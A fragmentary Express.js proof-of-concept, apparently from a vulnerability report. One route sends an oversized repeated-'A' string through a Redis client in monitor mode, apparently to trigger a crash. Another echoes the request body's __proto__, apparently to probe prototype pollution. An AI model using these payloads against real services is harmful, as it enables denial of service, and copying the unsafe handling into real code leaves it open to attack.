...
const crashString = "AAAAA".repeat(1000);
...
app.get('/poc', (req, res) => {
    ...
    redisClient.monitor(() => {});
    redisClient.set("key", str, (err, resp) => { console.log("set " + resp);
...
app.post('/poc2', (req, res) => {
    console.log(req.body)
    const first = req.body;
    const second = req.body.__proto__;
    console.log(req.body.__proto__)
    res.send({"1": first, "2": second});
    return res.end("OK")
});
